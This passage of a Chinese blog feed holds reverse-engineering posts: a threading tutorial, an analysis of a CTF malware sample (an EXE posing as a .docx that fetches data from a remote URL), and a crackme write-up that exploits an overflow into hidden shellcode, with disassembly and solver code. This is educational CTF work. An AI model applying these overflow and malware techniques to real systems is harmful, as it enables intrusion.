class="number">0</span>, printThread, (LPVOID)<span class="number">10</span>, CREATE_SUSPENDED, <span class="number">0</span>);  </div><div class="line">  </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)  </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">printf</span>(<span class="string">"main thread - %d\n"</span>, i + <span class="number">1</span>);  </div><div class="line">        <span class="comment">//当主线程输出到5的倍数时，恢复子线程运行  </span></div><div class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>)  </div><div class="line">        &#123;  </div><div class="line">            ResumeThread(hThread);  </div><div class="line">        &#125;  </div><div class="line">        <span class="comment">//当主线程输出到8的倍数时，暂停子线程运行  </span></div><div class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)  </div><div class="line">        &#123;  </div><div class="line">            SuspendThread(hThread);  </div><div class="line">        &#125;  </div><div class="line">        <span class="comment">//直接杀掉子线程  </span></div><div class="line">        <span class="comment">//TerminateThread(hThread,0);   </span></div><div class="line">        Sleep(<span class="number">500</span>);  </div><div class="line">    &#125;  </div><div class="line">      </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><h3 id="线程标识"><a href="#线程标识" class="headerlink" title="线程标识"></a>线程标识</h3><p>线程有ID, 但不是系统唯一, 而是进程环境中唯一有效.<br>线程的句柄是pthread_t类型, 该类型不能作为整数处理, 而是一个结构.</p><h3 id="线程退出的条件"><a href="#线程退出的条件" class="headerlink" title="线程退出的条件"></a>线程退出的条件</h3><p>下面任意一个都可以。<br>1.调用pthread_exit函数退出。<br>2.其他线程调用pthread_cancel取消该线程，且该线程可被取消。<br>3.创建线程的进程退出或者整个函数结束。<br>4.当前线程代码执行完毕。<br>5.其中的一个线程执行exec类函数执行新的代码，替换当前进程所有地址空间。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="keyword">pthread_mutex_t</span> mutex;</div><div class="line"><span class="keyword">pthread_cond_t</span> cond;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    pthread_cleanup_push(pthread_mutex_unlock,&amp;mutex);</div><div class="line">    <span class="comment">//提供函数回调保护</span></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread1 is running\n"</span>);</div><div class="line">        pthread_mutex_lock(&amp;mutex);</div><div class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread1 applied the condition\n"</span>);</div><div class="line">        pthread_mutex_unlock(&amp;mutex);</div><div class="line">        sleep(<span class="number">4</span>);</div><div class="line">    &#125;</div><div class="line">    pthread_cleanup_pop(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread2 is running\n"</span>);</div><div class="line">        pthread_mutex_lock(&amp;mutex);</div><div class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"thread2 applied the condition\n"</span>);</div><div class="line">        pthread_mutex_unlock(&amp;mutex);</div><div class="line">        sleep(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">pthread_t</span> thid1,thid2;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"condition variable study!\n"</span>);</div><div class="line">    pthread_mutex_init(&amp;mutex,<span class="literal">NULL</span>);</div><div class="line">    pthread_cond_init(&amp;cond,<span class="literal">NULL</span>);</div><div class="line">    pthread_create(&amp;thid1,<span class="literal">NULL</span>,(<span class="keyword">void</span>*)thread1,<span class="literal">NULL</span>);</div><div class="line">    pthread_create(&amp;thid2,<span class="literal">NULL</span>,(<span class="keyword">void</span>*)thread2,<span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">do</span>&#123;</div><div class="line">        pthread_cond_signal(&amp;cond);</div><div class="line">    &#125;<span class="keyword">while</span>(<span class="number">1</span>);</div><div class="line">    </div><div class="line">    sleep(<span class="number">20</span>);</div><div class="line">    pthread_exit(<span class="number">0</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">进程优点：编程、调试简单，可靠性较高。</div><div class="line">进程缺点：创建、销毁、切换速度慢，内存、资源占用大。</div><div class="line">线程优点：创建、销毁、切换速度快，内存、资源占用小。</div><div class="line">线程缺点：编程、调试复杂，可靠性较差。</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进程与线程是最常用的方式&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_病毒分析</title>
    <link href="http://yoursite.com/2018/04/01/re_8_doxc_exe/"/>
    <id>http://yoursite.com/2018/04/01/re_8_doxc_exe/</id>
    <published>2018-04-01T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:47.678Z</updated>
    
    <content type="html"><![CDATA[<p>EXE文件伪装成docx，初次见到蒙<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qX8PHnA" target="_blank" rel="external">http://pan.baidu.com/s/1qX8PHnA</a> 密码：34yi</p><h2 id="2、查看文件"><a href="#2、查看文件" class="headerlink" title="2、查看文件"></a>2、查看文件</h2><p>ida打开exe<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2t3vhhjkj30mp0azaam.jpg" alt=""><br>发现加壳程序,pedi没有检查倒是什么壳，放到kali用strings一下<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fl2t8nqbo8j30ed04g3yn.jpg" alt=""><br>尝试upx脱壳机脱，然而脱不下来,手动脱了,UPX的脱壳比较简单，找到pushad 和popad下断点，然后往下跟就好，找到的OEP<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2td2kzkpj31020ejq3s.jpg" alt=""><br>OEP开始一般都这样的<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2t5f8sq7j30x30d2gos.jpg" alt=""><br>右键使用OllyDump将程序dump出来即可，UPX加壳的程序不需要修复IAT就可以直接运行<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2tppwexjj30ye0gkta3.jpg" alt=""><br>用ida打开,已经可以看见代码啦<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2twn4r0jj30ym0fqgn1.jpg" alt=""><br>sub_401370函数的逻辑如下，主要行为为拷贝evil.exe到%temp%下一份，在从资源中释放evil.docx文件到当前目录</p><p>sub_401620的功能很简单，就是如果命令行参数个数为2（即之前新创建的进程），则循环删除evil.exe文件<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2u19e10nj30an08pa9x.jpg" alt=""><br>创建一个进程evil.exe “evil.exe”，然后打开docx<br>sub_4018F0从<a href="http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在" target="_blank" rel="external">http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在</a><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fl2u4b81agj30mx0e9jrh.jpg" alt=""><br>之后是两个解码函数，这里可以直接忽略其中的逻辑。<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2u5spu00j30lc08st8o.jpg" alt=""><br>然后是执行sub_401220的函数,OD动态跟一下看<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2umxfvz1j30gc0a13yf.jpg" alt=""></p><h2 id="3、搭建环境"><a href="#3、搭建环境" class="headerlink" title="3、搭建环境"></a>3、搭建环境</h2><p>我们用IIS在本地搭建web服务，使得程序能访问 <a href="http://www.ddctf.com/x.jpg。" target="_blank" rel="external">http://www.ddctf.com/x.jpg。</a></p><h2 id="3、OD动态"><a href="#3、OD动态" class="headerlink" title="3、OD动态"></a>3、OD动态</h2><p>0x402476（main）<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2wae1m51j30oz0izn1i.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;EXE文件伪装成docx，初次见到蒙&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re——看雪</title>
    <link href="http://yoursite.com/2018/03/28/re_7_kx1/"/>
    <id>http://yoursite.com/2018/03/28/re_7_kx1/</id>
    <published>2018-03-28T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:40.974Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦,看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波<br><a id="more"></a></p><h1 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h1><p>签到题直接过</p><h1 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h1><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qXVQmok" target="_blank" rel="external">http://pan.baidu.com/s/1qXVQmok</a> 密码：h5sw<br>去年你已经知道看雪啦，只是不敢去做题，自己太菜了，今年去试一试，第一道题签到题，很开心。然而，第二题，我已经跪啦，不过，在公布wp后，还是学到了许多，这里记录一下学习到的知识。</p><h2 id="2、分析"><a href="#2、分析" class="headerlink" title="2、分析"></a>2、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，有明确提示成功和失败信息。<br>二、入坑：OD加载，查找字符，定位到：“You get it!”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">地址       反汇编                                    文本字符串</div><div class="line">00401000  /$  68 6CB04100   PUSH ctf2017_.0041B06C                   ;  \n Crackme for CTF2017 @Pediy.\n</div><div class="line">00401005  |.  E8 382D0100   CALL ctf2017_.00413D42</div><div class="line">0040100A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040100D  |.  C705 34B04100&gt;MOV DWORD PTR DS:[0x41B034],0x2          ;  2</div><div class="line">00401017  |.  E8 34000000   CALL ctf2017_.00401050                   ;  input</div><div class="line">0040101C  |.  E8 6F000000   CALL ctf2017_.00401090                   ;  check1</div><div class="line">00401021  |.  E8 BA000000   CALL ctf2017_.004010E0                   ;  check2</div><div class="line">00401026  |.  A1 34B04100   MOV EAX,DWORD PTR DS:[0x41B034]          ;  0</div><div class="line">0040102B  |.  85C0          TEST EAX,EAX</div><div class="line">0040102D  |.  75 10         JNZ Xctf2017_.0040103F</div><div class="line">0040102F  |.  68 5CB04100   PUSH ctf2017_.0041B05C                   ;  You get it!\n</div><div class="line">00401034  |.  E8 092D0100   CALL ctf2017_.00413D42</div><div class="line">00401039  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040103C  |.  33C0          XOR EAX,EAX</div><div class="line">0040103E  |.  C3            RETN</div><div class="line">0040103F  |&gt;  68 38B04100   PUSH ctf2017_.0041B038                   ;  Bad register-code, keep trying.\n</div><div class="line">00401044  |.  E8 F92C0100   CALL ctf2017_.00413D42</div><div class="line">00401049  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040104C  |.  33C0          XOR EAX,EAX</div><div class="line">0040104E  \.  C3            RETN</div><div class="line">0040104F      90            NOP</div><div class="line">00401050  /$  83EC 0C       SUB ESP,0xC</div><div class="line">00401053  |.  68 ACB04100   PUSH ctf2017_.0041B0AC                   ;   Coded by Fpc.\n\n</div><div class="line">00401058  |.  E8 E52C0100   CALL ctf2017_.00413D42</div><div class="line">0040105D  |.  83C4 04       ADD ESP,0x4</div><div class="line">00401060  |.  68 90B04100   PUSH ctf2017_.0041B090                   ;   Please input your code:</div><div class="line">00401065  |.  E8 D82C0100   CALL ctf2017_.00413D42</div><div class="line">0040106A  |.  83C4 04       ADD ESP,0x4</div><div class="line">0040106D  |.  8D4424 00     LEA EAX,DWORD PTR SS:[ESP]</div><div class="line">00401071  |.  50            PUSH EAX</div><div class="line">00401072  |.  68 8CB04100   PUSH ctf2017_.0041B08C                   ;  %s</div><div class="line">00401077  |.  E8 F72C0100   CALL ctf2017_.00413D73</div><div class="line">0040107C  |.  8D4424 08     LEA EAX,DWORD PTR SS:[ESP+0x8]</div><div class="line">00401080  |.  83C4 14       ADD ESP,0x14</div><div class="line">00401083  \.  C3            RETN</div></pre></td></tr></table></figure></p><p>简单跟踪几步发现 401090、4010E0 为显性算法比较，分析 401090、4010E0：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">void check1()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 5 * (v1 - v0) + v1 == 0x8F503A42 &amp;&amp; 13 * (v1 - v0) + v0 == 0xEF503A42 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div><div class="line">void check2()</div><div class="line">&#123;</div><div class="line">  int v0; // [sp+4h] [bp-8h]@0</div><div class="line">  int v1; // [sp+8h] [bp-4h]@0</div><div class="line"></div><div class="line">  if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 17 * (v1 - v0) + v1 == 0xF3A94883 &amp;&amp; 7 * (v1 - v0) + v0 == 0x33A94883 )</div><div class="line">    --dword_41B034;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p> 把输入每4个字符ASCII作为十六进制赋值计算，假设为a,b则：<br> ⑴：0x5 <em> ( a - b ) + a == 0x8F503A42<br> ⑵：0xD </em> ( a - b ) + b == 0xEF503A42<br> ⑶：0x11 <em> ( a - b ) + a == 0xF3A94883<br> ⑷：0x7 </em> ( a - b ) + b == 0x33A94883<br>然而我分析到这里，感觉只能穷举。。。。结果当然失败了<br>后来看了大佬们的wp，果然学到了许多<br>大佬1：考虑该显性算法未随机打乱数值，低位特征依然继承到计算结果，因此先尝试求解低位，再逐个往高位求解，避免穷举范围过大：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">def solve_false():</div><div class="line">    start_time = time.clock()</div><div class="line">    for a1 in range(0x30,0x7b):</div><div class="line">        for b1 in range(0x30,0x7b):</div><div class="line">            if (0x5 * (a1 - b1) + a1) &amp; 0xff == 0x42:</div><div class="line">                if (0xd * (a1 - b1) + b1) &amp; 0xff == 0x42:</div><div class="line">                    if (0x11 *(a1 - b1) + a1) &amp; 0xff == 0x83:</div><div class="line">                        if (0x7 * (a1 - b1) + b1) &amp; 0xff == 0x83:</div><div class="line">                            print (&quot;found sn a1 : %x&quot; % a1)</div><div class="line">                            print (&quot;found sn b1 : %x&quot; % b1)</div><div class="line">    print (&apos;use time: %.3f second&apos; % (time.clock()-start_time))</div><div class="line">    return</div></pre></td></tr></table></figure></p><p>迅速识别该方程组无合法答案，无疑是作者埋的坑，立即寻找其他途径。<br>大佬2:z3识别改方程组无解（这里我还是没有懂，z3太强大啦）<br>大佬3：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x11 * ( a - b ) + a == 0xF3A94883</div><div class="line">0x5 * ( a - b ) + a == 0x8F503A42</div></pre></td></tr></table></figure></p><p>推出:<br><code>12 * ( a - b ) == 0x64590d41</code><br>右边为偶数，左边为奇数，无解</p><p>这道题由于没有判断输入长度，便存在溢出（这里我完全没有想打RE，还有溢出，涨知识了），那溢出到哪里呢？,大佬们发现0x00413131存在shellcode编码（膜拜），溢出到这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">.text:0040112B                 db 5 dup(90h)</div><div class="line">.text:00401130                 dd 4800h dup(0)</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413130                 retn</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413131                 db 83h, 0C4h, 0F0h</div><div class="line">.text:00413134                 dd 20712A70h, 0F1C75F2h, 28741C71h, 2E0671DDh, 870F574h</div><div class="line">.text:00413134                 dd 74F17169h, 0DC167002h, 0EA74C033h, 0DC261275h, 0F471E771h</div><div class="line">.text:00413134                 dd 6903740Fh, 0EB75EB70h, 0FDF7069h, 22712C70h, 0B8261F7Dh</div><div class="line">.text:00413134                 dd 2B741E71h, 3E067169h, 870F57Ch, 7CF17169h, 0DC197002h</div><div class="line">.text:00413134                 dd 41B034A3h, 75E77400h, 0E571DC12h, 7CDCF271h, 0E9706903h</div><div class="line">.text:00413134                 dd 6965E97Dh, 70B8DC70h, 3E1D7127h, 710F1971h, 0DD257019h</div><div class="line">.text:00413134                 dd 0F6700571h, 71DD0870h, 700270F2h, 70580F14h, 0F1171ECh</div><div class="line">.text:00413134                 dd 0F671EA71h, 0DD03700Fh, 0ED71ED70h, 0FE170DDh, 7F36217Eh</div><div class="line">.text:00413134                 dd 671A7D27h, 1D2A74B8h, 65690D7Eh, 67C067Fh, 1D361C7Eh</div><div class="line">.text:00413134                 dd 8BDC0E7Fh, 75EA74C8h, 7E69DC14h, 0C1F47FEFh, 0F97CFB7Fh</div><div class="line">.text:00413134                 dd 0EA7DE27Fh, 0D87E6965h, 772076B8h, 2E1A7F27h, 0DD2978B8h</div><div class="line">.text:00413134                 dd 778D0D76h, 67EF207h, 0DD261B76h, 58B80E77h, 1479EB78h</div><div class="line">.text:00413134                 dd 768DB865h, 0FF477EFh, 0F97EFB77h, 0EA7FE177h, 0B8D9768Dh</div><div class="line">.text:00413134                 dd 73F22372h, 1C756729h, 0DD2C740Fh, 66690E72h, 6740673h</div><div class="line">.text:00413134                 dd 0DD361E72h, 0DD261073h, 0E974D88Bh, 12751575h, 73ED72DCh</div><div class="line">.text:00413134                 dd 0FB730FF3h, 0E073F974h, 6966E875h, 740FD672h, 2E1D7527h</div><div class="line">.text:00413134                 dd 75DC1973h, 0DD267C19h, 742E0475h, 0F3751D08h, 16740272h</div><div class="line">.text:00413134                 dd 0ED7C58C1h, 0C1F3137Dh, 0F575EA75h, 1D03720Fh, 0EC73EC74h</div><div class="line">.text:00413134                 dd 0DF741D66h, 0F23EBDCh, 0EB227585h, 85261DFAh, 74D08B29h</div><div class="line">.text:00413134                 dd 0EBF6EB18h, 75D08BF4h, 32F2EBECh, 0E9754A3Eh, 6256F2EBh</div><div class="line">.text:00413134                 dd 0EDEB7A6Eh, 7D267C7Ah, 187DF21Ch, 70187D0Fh, 37D1D25h</div><div class="line">.text:00413134                 dd 7D69087Ch, 7C027CF4h, 0C18BDC16h, 1271ED70h, 7DEB7DDCh</div><div class="line">.text:00413134                 dd 37CC1F5h, 7DEC7C69h, 7C6966ECh, 2A780FDFh, 793E2079h</div><div class="line">.text:00413134                 dd 1C79B81Ch, 798D2874h, 0F5783606h, 79DD0878h, 780278F1h</div><div class="line">.text:00413134                 dd 0C32B0F16h, 1275EA74h, 0E7790F2Eh, 78B8F479h, 0EB78DD03h</div><div class="line">.text:00413134                 dd 78DDEB79h, 2B70B8DFh, 79662271h, 1E71C11Eh, 71692A70h</div><div class="line">.text:00413134                 dd 70F67805h, 0F271DD08h, 19700278h, 2E0C10Fh, 1471EA70h</div><div class="line">.text:00413134                 dd 0F107966h, 0F171E571h, 700278DCh, 36E979E9h, 0C1DC70DDh</div><div class="line">.text:00413134                 dd 22712B70h, 0B81E7326h, 29781E71h, 571DD3Eh, 870F572h</div><div class="line">.text:00413134                 dd 72F1711Dh, 0C1177002h, 0EA78C103h, 733E1379h, 0E671C10Fh</div></pre></td></tr></table></figure></p><p>那溢出长度是多少呢？输入aaaabbbbccccddddeeee,发现返回地址是dddd,<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzsu500uj31440g1q7v.jpg" alt=""><br>再次输入aaaabbbbccc11A<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzvguj53j31h20guady.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzw6hh09j319v08rabc.jpg" alt=""><br>黑色，这里右键-分析-从模块删除分析<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkxzzfg35gj31ah0bwgod.jpg" alt=""><br>这里出现花指令(代码混淆，花指令不影响程序运行。就是看耐心。就拿这个题目来说。花指令就是跳来跳去。可以脱去，其实不脱话也一样的)<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fky059od5wj30k309zq4f.jpg" alt=""><br>一步一步分析<br>在0x413131位置设置新断点，回车断下，忽略花指令，仅摘录算法相关代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00413131    83C4 F0         add esp,-0x10</div><div class="line">00413150    33C0            xor eax,eax</div><div class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax </div><div class="line">004131BA    58              pop eax          //aaaa</div><div class="line">004131EB    8BC8            mov ecx,eax</div><div class="line">0041321F    58              pop eax     //bbbb</div><div class="line">00413254    8BD8            mov ebx,eax</div><div class="line">00413289    58              pop eax   //cccc</div><div class="line">004132B5    8BD0            mov edx,eax</div><div class="line">004132AD    8BD0            mov edx,eax</div><div class="line">004132E2    8BC1            mov eax,ecx  //eax=aaaa</div><div class="line">00413316    2BC3            sub eax,ebx   //ebx=bbbb eax=a-b</div><div class="line">00413349    C1E0 02         shl eax,0x2    //(a-b)*4</div><div class="line">00413380    03C1            add eax,ecx     //(a-b)*4+a</div><div class="line">004133B5    03C2            add eax,edx     //(a-b)*4+a+c</div><div class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2   ///0xEAF917E2==((a-b)*4+a+c)</div><div class="line"></div><div class="line">00413B1E    58              pop eax                ; ctf2017_.00413E3E</div><div class="line">00413B4E    35 0E210100     xor eax,0x1210E</div><div class="line">00413B83    3305 34B04100   xor eax,dword ptr ds:[0x41B034]</div><div class="line">0040103F    68 38B04100     push ctf2017_.0041B038         &quot;Bad register-code&quot;</div><div class="line"></div><div class="line">00413455    03C1            add eax,ecx     //ecx=aaaa</div><div class="line">00413489    2BC3            sub eax,ebx    //ebx=bbbb</div><div class="line">004134BF    8BD8            mov ebx,eax    //ebx=eax=a-b</div><div class="line">004134F3    D1E0            shl eax,1   //(a-b)*2</div><div class="line">00413525    03C3            add eax,ebx  //(a-b)*3</div><div class="line">00413559    03C1            add eax,ecx   //(a-b)*3+a</div><div class="line">0041358F    8BC8            mov ecx,eax //</div><div class="line">004135C3    03C2            add eax,edx   //(a-b)*3+a+c</div><div class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8 //(a-b)*3+a+c==0xE8F508C8</div><div class="line"></div><div class="line">00413665    8BC1            mov eax,ecx</div><div class="line">0041365D    8BC1            mov eax,ecx //(a-b)*3+a</div><div class="line">004136A7    2BC2            sub eax,edx  //(a-b)*3+a-c</div><div class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68 // (a-b)*3+a-c==0xC0A3C68</div></pre></td></tr></table></figure></p><p>3、求解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(a-b)*3+a-c==0xC0A3C68</div><div class="line">(a-b)*3+a+c==0xE8F508C8</div><div class="line">(a-b)*4+a+c==0xEAF917E2</div></pre></td></tr></table></figure></p><p>以参考了许多大神的代码<br>学到了一种解决方程的方法，贼好用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from sympy import *</div><div class="line">a=Symbol(&apos;a&apos;)</div><div class="line">b=Symbol(&apos;b&apos;)</div><div class="line">c=Symbol(&apos;c&apos;)</div><div class="line">print (solve([(a-b)*3+a-c-0xC0A3C68,(a-b)*3+a+c-0xE8F508C8,(a-b)*4+a+c-0xEAF917E2],[a,b,c]))</div></pre></td></tr></table></figure></p><h1 id="3、Re3"><a href="#3、Re3" class="headerlink" title="3、Re3"></a>3、Re3</h1><h2 id="1、题目-1"><a href="#1、题目-1" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>第三题，我感觉世界观坍塌啦。依然不会，还是学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、入坑：<br>OD加载（好像我的od直接过了反调试），f9，运行，什么鬼，直接跳到了dll,继续f9….终于出现对话框，输入<br>12345678，结果程序崩溃。</p><p>IDA打开，定位到CrackMe字符串，找到关键函数<br><figure class="highlight plain"><table><tr><td 